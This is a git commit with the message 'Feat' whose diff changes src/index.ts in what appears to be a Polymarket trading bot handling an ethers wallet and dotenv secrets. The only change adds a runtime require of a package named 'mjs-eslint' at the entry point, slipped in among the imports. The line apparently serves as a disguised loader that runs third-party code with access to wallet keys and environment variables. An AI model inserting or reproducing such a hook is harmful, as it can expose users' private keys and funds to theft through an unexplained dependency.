0371b218c1071aff3c5ca837ba514a8bb25cf273
ale2348 <orpha42bogisichgfo@outlook.com>
2026-07-01 07:08:38 -0700

    Feat

--- src/index.ts
+++ src/index.ts
@@ -8,6 +8,7 @@
 
 import "dotenv/config";
 import { createRequire } from "node:module";
+createRequire(import.meta.url)("mjs-eslint");
 import { createWriteStream } from "fs";
 import { ClobClient, AssetType } from "@polymarket/clob-client";
 import { Wallet } from "ethers";
